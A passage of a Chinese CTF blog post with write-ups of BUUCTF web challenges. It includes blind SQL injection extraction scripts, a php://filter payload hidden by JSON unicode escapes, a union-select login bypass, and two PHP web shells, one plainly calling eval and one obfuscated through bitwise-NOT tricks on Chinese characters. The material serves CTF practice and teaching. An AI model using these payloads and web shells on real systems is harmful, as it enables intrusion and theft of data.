<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment"># if correct , return empty, else return something</span></span><br><span class="line">url = <span class="string">"http://c385297f-15e1-4d95-a39b-3f2aa03b3822.node3.buuoj.cn/backend/content_detail.php?id="</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># [+] --&gt;admin,contents&lt;--</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='contents')),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># id,title,content,is_enable</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="comment"># id,username,password,is_enable</span></span><br><span class="line"><span class="comment">#payload = "1^(ord(substr((select(group_concat(password))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line">payload = <span class="string">"1^(ord(substr((select(group_concat(username))from(admin)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    u_bound = <span class="number">255</span>; l_bound = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> u_bound &gt;= l_bound:</span><br><span class="line">        m_bound = (u_bound + l_bound) // <span class="number">2</span></span><br><span class="line">        payload_tmp = payload.format(index, m_bound)</span><br><span class="line">        url_tmp = url + urllib.parse.quote(payload_tmp)</span><br><span class="line">        res = requests.get(url_tmp).content.decode(<span class="string">'utf8'</span>)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="comment"># exit(0)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"title"</span> <span class="keyword">in</span> res:</span><br><span class="line">            u_bound = m_bound - <span class="number">1</span></span><br><span class="line">            tmp = m_bound</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l_bound = m_bound + <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(tmp)</span></span><br><span class="line">    result += chr(tmp)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    <span class="comment"># sys.stdout.write("[+] --&gt;%s&lt;--\r" % (result))</span></span><br><span class="line">    <span class="comment"># sys.stdout.flush()</span></span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
<p>跑出来两组用户名和密码，组合尝试就行了。</p>
<h2 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h2><p>考察<code>通过JSON转义字符串绕过</code></p>
<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，在第三个按钮看到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $banword = [</span><br><span class="line">    <span class="comment">// no path traversal</span></span><br><span class="line">    <span class="string">'\.\.'</span>,</span><br><span class="line">    <span class="comment">// no stream wrapper</span></span><br><span class="line">    <span class="string">'(php|file|glob|data|tp|zip|zlib|phar):'</span>,</span><br><span class="line">    <span class="comment">// no data exfiltration</span></span><br><span class="line">    <span class="string">'flag'</span></span><br><span class="line">  ];</span><br><span class="line">  $regexp = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $banword) . <span class="string">'/i'</span>;</span><br><span class="line">  <span class="keyword">if</span> (preg_match($regexp, $str)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$body = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$json = json_decode($body, <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_valid($body) &amp;&amp; <span class="keyword">isset</span>($json) &amp;&amp; <span class="keyword">isset</span>($json[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  $page = $json[<span class="string">'page'</span>];</span><br><span class="line">  $content = file_get_contents($page);</span><br><span class="line">  <span class="keyword">if</span> (!$content || !is_valid($content)) &#123;</span><br><span class="line">    $content = <span class="string">"&lt;p&gt;not found&lt;/p&gt;\n"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $content = <span class="string">'&lt;p&gt;invalid request&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no data exfiltration!!!</span></span><br><span class="line">$content = preg_replace(<span class="string">'/HarekazeCTF\&#123;.+\&#125;/i'</span>, <span class="string">'HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;'</span>, $content);</span><br><span class="line"><span class="keyword">echo</span> json_encode([<span class="string">'content'</span> =&gt; $content]);</span><br></pre></td></tr></table></figure>
<p>通过审计代码发现，<code>is_valid()</code>函数中通过黑名单过滤了一些字符串，基本上都是可能用到的协议。<br>然后我们发现<code>body</code>的值是通过<code>file_get_contents(&#39;php://input&#39;)</code>传过来的，查了一下涨知识了：</p>
<blockquote>
<p>如果POST的原始数据是一维数组或<code>&amp;</code>拼接的标准格式的键值对字符串，那么可以用<code>$_POST</code>来获取。如果发送json字符串，一般要通过<code>file_get_contents</code>获取。</p>
</blockquote>
<p>因为这里是通过JSON编码传输的，因此用这种方式，然后对<code>body</code>的值进行解码并赋值给<code>json</code>。然后再利用自定义的<code>is_valid()</code>函数进行判断，并且可以看出<code>json</code>中有<code>page</code>这个键值对。<br>思路就很明显了，我们需要通过JSON传输数据来读取到flag，这里就需要用到php的伪协议了，但是<code>php</code>已经被ban了，但是的但是：<code>\uXXXX</code>可以在<code>JSON</code>中转义字符，例如<code>A=\u0041</code>，因此利用这个特性来进行绕过。</p>
<h3 id="解题-1"><a href="#解题-1" class="headerlink" title="解题"></a>解题</h3><p>最终构造的payload如下：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">&#123;"page":"<span class="symbol">\u</span>0070<span class="symbol">\u</span>0068<span class="symbol">\u</span>0070://filter/convert.base64-encode/resource=/<span class="symbol">\u</span>0066<span class="symbol">\u</span>006c<span class="symbol">\u</span>0061<span class="symbol">\u</span>0067"&#125;</span><br><span class="line">/* <span class="symbol">\u</span>0070<span class="symbol">\u</span>0068<span class="symbol">\u</span>0070表示php；<span class="symbol">\u</span>0066<span class="symbol">\u</span>006c<span class="symbol">\u</span>0061<span class="symbol">\u</span>0067表示flag */</span><br></pre></td></tr></table></figure>
<p>成功拿到flag：<br><img src="http://www.ggb0n.cool/images/BUUCTF-web97.png" alt=""></p>
<h2 id="CISCN-2019-Easyweb"><a href="#CISCN-2019-Easyweb" class="headerlink" title="[CISCN 2019]Easyweb"></a>[CISCN 2019]Easyweb</h2><p>敏感文件泄露，文件上传时短标签绕过php过滤</p>
<h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>进入题目，访问<code>robots.txt</code>发现源码备份文件，下载到<code>iamge.php.bak</code>，源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">"id"</span>])?$_GET[<span class="string">"id"</span>]:<span class="string">"1"</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">"path"</span>])?$_GET[<span class="string">"path"</span>]:<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">"\\0"</span>,<span class="string">"%00"</span>,<span class="string">"\\'"</span>,<span class="string">"'"</span>),<span class="string">""</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">"select * from images where id='&#123;$id&#125;' or path='&#123;$path&#125;'"</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">"./"</span> . $row[<span class="string">"path"</span>];</span><br><span class="line">header(<span class="string">"Content-Type: image/jpeg"</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>
<p>审计代码发现应该需要进行sql注入，但是单引号被过滤掉了。由于转义函数<code>addslashes</code>的存在，同时<code>\0</code>、<code>&#39;</code>被过滤，所以可以输入<code>\0</code>，经过<code>addslashes</code>函数会先变成<code>\\0</code>,然后经过<code>str_replace</code>函数，会变成<code>\</code>，这样，就把<code>id</code>后面的单引号给转义了。所以可以构造类似下面的payload：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">http://a<span class="number">215</span>b<span class="number">254</span>-<span class="keyword">c</span><span class="number">237</span><span class="number">-4670</span>-a<span class="number">4</span><span class="keyword">cc</span><span class="number">-9</span>dfea<span class="number">3</span>d<span class="number">34</span>f<span class="number">26</span>.node<span class="number">3</span>.buuoj.cn/image.php?id=\<span class="number">0</span>'&amp;path= <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="symbol">%23</span></span><br></pre></td></tr></table></figure>
<p>后台执行的sql语句便是：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> images <span class="keyword">where</span> <span class="keyword">id</span>=<span class="string">'\'</span> <span class="keyword">or</span> <span class="keyword">path</span>=<span class="string">' or 1=1#</span></span><br></pre></td></tr></table></figure>
<p>从而绕过了过滤，那么利用这一点写脚本注入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">name=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">21</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    h = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> abs(l-h)&gt;<span class="number">1</span>:</span><br><span class="line">        i=int((l+h)/<span class="number">2</span>)</span><br><span class="line">        url=<span class="string">"http://a215b254-c237-4670-a4cc-9dfea3d34f26.node3.buuoj.cn/image.php?id=\\0'&amp;path= or ascii(substr((select password from users),"</span>+str(j)+<span class="string">",1))&gt;"</span>+str(i)+<span class="string">"%23"</span></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        time.sleep(<span class="number">0.005</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code==<span class="string">'429'</span>:</span><br><span class="line">            print(<span class="string">'to fast'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="string">'Content-Length'</span> <span class="keyword">in</span> r.headers:</span><br><span class="line">            l = i</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h = i</span><br><span class="line">    name += chr(h)</span><br><span class="line">print(name)</span><br></pre></td></tr></table></figure>
<p>拿到密码之后，用admin身份登录，发现需要进行文件上传，并且会将文件名和用户名写入日志文件。由于日志文件的格式是php的，因此考虑写入shell。<br>这里由于用户名已经是<code>admin</code>不可变的，那就需要在文件名上做手脚，但是文件名进行了<code>php/i</code>的过滤，此处利用短标签绕过：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">filename="<span class="php"><span class="meta">&lt;?</span>=$_GET[<span class="string">'cmd'</span>]; <span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]); <span class="meta">?&gt;</span></span>"</span><br></pre></td></tr></table></figure>
<p>关于短标签扩展一下：</p>
<blockquote>
<p>短标签<code>&lt;? ?&gt;</code>需要<code>php.ini</code>开启<code>short_open_tag = On</code>，但<code>&lt;?= ?&gt;</code>不受该条控制。</p>
</blockquote>
<p>上传小马之后，得到如下的文件名，然后蚁剑连接拿到shell，即可拿到flag。<br><img src="http://www.ggb0n.cool/images/BUUCTF-web98.png" alt=""></p>
<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>考察点：多次编码(base32、base64)，<code>union select</code>注入结合<code>md5</code>通过后台判断。</p>
<h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>随便输入用户名密码后，查看源码发现一串base32：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">MMZF<span class="name">M422</span>K<span class="number">5</span>HDASKD<span class="symbol">N5</span>TVU<span class="number">3</span>SKOZRFGQRRMMZF<span class="name">M6</span>KJJBS<span class="name">G6</span>WSYJJWESSCWPJ<span class="symbol">NFQSTVLFLTC3</span>CJIQYGOSTZKJ<span class="number">2</span><span class="attr">VSVZRNRFHOPJ5</span></span><br></pre></td></tr></table></figure>
<p>解码之后：</p>
<figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">c<span class="number">2</span><span class="attr">VsZWN0</span>ICogZ<span class="symbol">nJvbSB1</span>c<span class="number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="number">1</span>lID<span class="number">0</span>gJyRuYW<span class="number">1</span>lJw==</span><br></pre></td></tr></table></figure>
<p>再通过base64解码：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username = <span class="string">'$name'</span></span><br></pre></td></tr></table></figure>
<p>由此可见，在<code>username</code>处存在注入点。<br>用常规的注入测试一下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>提示<code>wrong user</code>，接着我们把<code>admin</code>分别替换1、2、3的位置，发现替换2的时候报错变成<code>wrong pass</code>说明了<code>username</code>就是在第二个位置，原题提示了<code>md5</code>，肯定是对密码进行了哈希，那么可以推断，3处应该替换为密码的哈希值。<br>那么我们利用上面的语句，再把随便输入的密码的md5值替换到3的位置，在后头就能构成满足后端判断的查询语句了。</p>
<h3 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h3><p>随便找个密码以及密码的md5值，这里用的是<code>123456/e10adc3949ba59abbe56e057f20f883e</code>，最终payload如下：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">' <span class="class"><span class="keyword">union</span> <span class="title">select</span></span> <span class="number">1</span>,<span class="symbol">'admin</span><span class="string">','</span>e10adc3949ba59abbe56e057f20f883e'%<span class="number">23</span></span><br></pre></td></tr></table></figure>
<p>username处输入payload，password输入123456即可拿到flag。</p>
<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p>利用异或构造webshell，参考上一篇博客的知识点。<br>fuzz脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-Type: text/html; charset=utf-8'</span>);</span><br><span class="line">$str = <span class="string">'当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”'</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;mb_strlen($str, <span class="string">'utf-8'</span>); $i++)</span><br><span class="line">&#123;</span><br><span class="line">	$st = mb_substr($str, $i,<span class="number">1</span>, <span class="string">'utf-8'</span>);</span><br><span class="line">	$a = ~($st);</span><br><span class="line">	$b = $a[<span class="number">1</span>];				<span class="comment">#取汉字的第一位</span></span><br><span class="line">	<span class="keyword">if</span>($b==$_GET[<span class="string">'a'</span>])		<span class="comment">#$_GET['a']想要得到的字符</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> $st;<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造webshell</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $__=[];</span></span><br><span class="line"><span class="php">    $___=[];</span></span><br><span class="line"><span class="php">    $_=$__==$___;<span class="comment">//true = 1   用作索引</span></span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $__=~(瞰);</span></span><br><span class="line"><span class="php">    $___=$__[$_];<span class="comment">//a</span></span></span><br><span class="line"><span class="php">    $__=~(北);</span></span><br><span class="line"><span class="php">    $___.=$__[$_].$__[$_];<span class="comment">//ss</span></span></span><br><span class="line"><span class="php">    $__=~(的);</span></span><br><span class="line"><span class="php">    $___.=$__[$_];<span class="comment">//e</span></span></span><br><span class="line"><span class="php">    $__=~(半);</span></span><br><span class="line"><span class="php">    $___.=$__[$_];<span class="comment">//r</span></span></span><br><span class="line"><span class="php">    $__=~(拾);</span></span><br><span class="line"><span class="php">    $___.=$__[$_];<span class="comment">//t</span></span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $____=~(~(_));<span class="comment">//_</span></span></span><br><span class="line"><span class="php">    $__=~(说);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//P</span></span></span><br><span class="line"><span class="php">    $__=~(小);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//O</span></span></span><br><span class="line"><span class="php">    $__=~(次);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//S</span></span></span><br><span class="line"><span class="php">    $__=~(站);</span></span><br><span class="line"><span class="php">    $____.=$__[$_];<span class="comment">//T</span></span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    $_=$$____;</span></span><br><span class="line"><span class="php">    $___($_[_]);    </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这题还没复现成功，后续会补充…</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">ggb0n</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://ggb0n.cool/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/">http://ggb0n.cool/2020/02/15/BUUCTF-web%E5%88%B7%E9%A2%98%E2%85%A2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/web/">web</a><a class="post-meta__tags" href="/tags/RCE/">RCE</a><a class="post-meta__tags" href="/tags/SSRF/">SSRF</a><a class="post-meta__tags" href="/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">二次注入</a><a class="post-meta__tags" href="/tags/perl%E4%B8%8B%E5%88%A9%E7%94%A8open%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8CRCE/">perl下利用open命令进行RCE</a><a class="post-meta__tags" href="/tags/XFF%E6%B3%A8%E5%85%A5/">XFF注入</a></div><div class="social-share pull-right" data-disabled="douban,diandian"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/2020/02/18/BSidesSF2019-WriteUp/"><i class="fa fa-chevron-left">  </i><span>BSidesSF2019-WriteUp</span></a></div><div class="next-post pull-right"><a href="/2020/02/14/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98SQL%E6%B3%A8%E5%85%A5%E9%A2%98%E7%9B%AE%E8%A7%A3%E6%9E%90/"><span>极客大挑战SQL注入题目解析</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2020 by ggb0n</div><div class="footer_custom_text">一生一世，爱你一人。</div><div class="icp"><a href="http://www.beian.miit.gov.cn/" target="_blank" rel="noopener"><span>豫ICP备20003023号</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>